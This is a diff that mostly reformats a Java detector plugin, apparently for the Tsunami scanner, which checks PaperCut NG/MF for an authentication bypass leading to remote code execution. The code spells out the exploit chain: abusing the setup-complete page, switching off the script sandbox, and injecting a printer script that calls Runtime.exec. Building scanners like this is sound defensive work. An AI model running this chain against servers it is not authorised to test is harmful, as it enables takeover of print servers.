@@ -20,7 +20,6 @@ import static com.google.common.collect.ImmutableList.toImmutableList;
 
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.data.NetworkServiceUtils;
 import com.google.tsunami.common.net.http.*;
@@ -31,8 +30,6 @@ import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
 import com.google.tsunami.proto.*;
-import java.io.IOException;
-import java.nio.charset.StandardCharsets;
 import java.time.Clock;
 import java.time.Instant;
 import java.util.HashMap;
@@ -84,11 +81,13 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
 
     HttpResponse response = helper.sendGetRequest("service=page/SetupCompleted");
     Matcher bodyContentMatcher =
-            Pattern.compile("Configuration Wizard : Setup Complete")
-                    .matcher(response.bodyString().orElse(""));
+        Pattern.compile("Configuration Wizard : Setup Complete")
+            .matcher(response.bodyString().orElse(""));
 
     // If all initial checks pass, then lets check the RCE vuln
-    if ( response.status() == HttpStatus.OK && bodyContentMatcher.find() && !helper.JSESSION_ID.isEmpty()) {
+    if (response.status() == HttpStatus.OK
+        && bodyContentMatcher.find()
+        && !helper.JSESSION_ID.isEmpty()) {
 
       // SetupCompleted payload/page
       HashMap<String, String> setupCompletedPage = new HashMap<String, String>();
@@ -100,64 +99,81 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
 
       // Post/send above params
       helper.sendPostRequest(helper.buildParameterString(setupCompletedPage));
-//      helper.sendGetRequest("service=page/Dashboard");
+      //      helper.sendGetRequest("service=page/Dashboard");
 
       // Changing (or attempting to) change the settings required for RCE
       helper.changeSettingForPayload("print-and-device.script.enable", true);
       helper.changeSettingForPayload("print.script.sandboxed", false);
 
       helper.sendGetRequest("service=page/PrinterList"); // Get list of printers
-      helper.sendGetRequest("service=direct/1/PrinterList/selectPrinter&sp=l1001"); // Get the first one
-      helper.sendGetRequest("service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4"); // Open up scripting tab
+      helper.sendGetRequest(
+          "service=direct/1/PrinterList/selectPrinter&sp=l1001"); // Get the first one
+      helper.sendGetRequest(
+          "service=direct/1/PrinterDetails/printerOptionsTab.tab&sp=4"); // Open up scripting tab
 
       // Let's build and send the actual payload
       HashMap<String, String> printerScriptPayload = new HashMap<String, String>();
       printerScriptPayload.put("service", "direct/1/PrinterDetails/$PrinterDetailsScript.$Form");
-      printerScriptPayload.put("sp","S0");
-      printerScriptPayload.put("Form0","printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1");
-      printerScriptPayload.put("printerId","l1001");
-      printerScriptPayload.put("enablePrintScript","on");
+      printerScriptPayload.put("sp", "S0");
+      printerScriptPayload.put(
+          "Form0", "printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1");
+      printerScriptPayload.put("printerId", "l1001");
+      printerScriptPayload.put("enablePrintScript", "on");
 
       // Build the payload string to inject
       Payload payload;
       if (payloadGenerator.isCallbackServerEnabled()) {
         PayloadGeneratorConfig config =
-                PayloadGeneratorConfig.newBuilder()
-                        .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
-                        .setInterpretationEnvironment(
-                                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
-                        .setExecutionEnvironment(
-                                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
-                        .build();
+            PayloadGeneratorConfig.newBuilder()
+                .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
+                .setInterpretationEnvironment(
+                    PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
+                .setExecutionEnvironment(
+                    PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
+                .build();
 
         payload = this.payloadGenerator.generate(config);
 
-        printerScriptPayload.put("scriptBody","function printJobHook(inputs, actions) {}\r\n" +
-                                 "java.lang.Runtime.getRuntime().exec('" + payload.getPayload() + "');");
-        printerScriptPayload.put("$Submit$1","Apply");
+        printerScriptPayload.put(
+            "scriptBody",
+            "function printJobHook(inputs, actions) {}\r\n"
+                + "java.lang.Runtime.getRuntime().exec('"
+                + payload.getPayload()
+                + "');");
+        printerScriptPayload.put("$Submit$1", "Apply");
 
         // Sending payload
         helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));
-        try { Thread.sleep(1000); } catch (InterruptedException err) { logger.atWarning().withCause(err).log(); }
+        try {
+          Thread.sleep(1000);
+        } catch (InterruptedException err) {
+          logger.atWarning().withCause(err).log();
+        }
 
         // Check payload
         isVulnerable = payload.checkIfExecuted();
 
-      } else { // If the callback server is not enabled, try to verify the payload through some limited checks.
-        printerScriptPayload.put("scriptBody","function printJobHook(inputs, actions) {}\r\n" +
-                "java.lang.Runtime.getRuntime().exec('hostname');"); // If we can even do this, that's all we really can do
-        printerScriptPayload.put("$Submit$1","Apply");
+      } else { // If the callback server is not enabled, try to verify the payload through some
+               // limited checks.
+        printerScriptPayload.put(
+            "scriptBody",
+            "function printJobHook(inputs, actions) {}\r\n"
+                + "java.lang.Runtime.getRuntime().exec('hostname');"); // If we can even do this,
+                                                                       // that's all we really can
+                                                                       // do
+        printerScriptPayload.put("$Submit$1", "Apply");
 
         // Sending payload
-        HttpResponse payloadResponse = helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));
+        HttpResponse payloadResponse =
+            helper.sendPostRequest(helper.buildParameterString(printerScriptPayload));
 
         Matcher matchResponseResult =
-                Pattern.compile("Saved successfully") // Check for this message in the response
-                        .matcher(payloadResponse.bodyString().orElse(""));
+            Pattern.compile("Saved successfully") // Check for this message in the response
+                .matcher(payloadResponse.bodyString().orElse(""));
 
-        // If the resulting string in response matched, then the script got submitted and an RCE is possible
+        // If the resulting string in response matched, then the script got submitted and an RCE is
+        // possible
         isVulnerable = matchResponseResult.find();
-
       }
 
       // Changing (or attempting to) change the settings required for RCE
@@ -197,10 +213,5 @@ public final class PapercutNGMFVulnDetectorWithPayload implements VulnDetector {
                     "Update to versions that are at least 20.1.7, 21.2.11, 22.0.9, or any later"
                         + " version."))
         .build();
-  }
-
-  private enum RequestType {
-    GET,
-    POST
   }
 }
